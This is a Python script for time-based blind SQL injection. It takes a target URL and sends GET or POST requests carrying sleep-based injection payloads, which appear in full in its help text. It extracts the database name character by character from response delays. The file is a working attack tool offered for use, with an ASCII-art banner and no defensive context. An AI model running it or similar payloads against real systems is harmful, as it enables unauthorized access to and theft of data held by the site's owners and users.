from timeit import default_timer as timer
import requests
import argparse
parser = argparse.ArgumentParser(description='blind sql injection', usage='Script options')
parser.add_argument('-get', help='HTTP GET method. Example: python3 blind_sql.py -get -u  "http://example.com:1337?id=1 and (case when ASCII(substring((SELECT database() limit 0,1), {}, 1))={} THEN sleep(3) END) -- -" ', action="store_true")
parser.add_argument('-data', help='HTTP POST method. Example: python3 blind_sql.py -data -u "http://example.com:1337" -param "name" -value "5 and (case when ASCII(substring((SELECT database() limit 0,1), {}, 1))={} THEN sleep(3) END) -- -"',  action="store_true")
parser.add_argument('-u',  type=str, help='Enter URL', )
parser.add_argument('-value',  type=str, help='Data string to be sent through POST (-value "5 and (case when ASCII(substring((SELECT database() limit 0,1), {}, 1))={} THEN sleep(3) END) -- -" if "id=1")')
parser.add_argument('-param',  type=str, help='Data string to be sent through POST (-param "id" if "id=1")')
parser.add_argument('-delay',  type=int, help='Sort by server response delay in payload (-delay=3)', default=0)
args = parser.parse_args()


length_result = 50  # Possible string length
dictionary = list(range(48, 58)) + list(range(95, 126))


def greetings():
    print('''
██████╗ ██╗     ██╗███╗   ██╗██████╗     ███████╗ ██████╗ ██╗         ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██║     ██║████╗  ██║██╔══██╗    ██╔════╝██╔═══██╗██║         ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██████╔╝██║     ██║██╔██╗ ██║██║  ██║    ███████╗██║   ██║██║         ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██╔══██╗██║     ██║██║╚██╗██║██║  ██║    ╚════██║██║▄▄ ██║██║         ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██████╔╝███████╗██║██║ ╚████║██████╔╝    ███████║╚██████╔╝███████╗    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝╚═════╝     ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
''')


def blind_sql():
    i = 1
    print('Print result:')
    while(i <= length_result):
        for char in dictionary:
            start_time = timer()
            if args.get == True:
                res = requests.get(args.u.format(i, char))
            elif args.data == True:
                res = requests.post(args.u, data={args.param: args.value.format(i, char)})
            end_time = timer()
            time = end_time-start_time
            if args.delay != 0:
                if time > args.delay:
                    print(chr(char), end='', flush=True)
                    break
            else:
                print(chr(char), time)
        i += 1


if __name__ == "__main__":
    greetings()
    blind_sql()
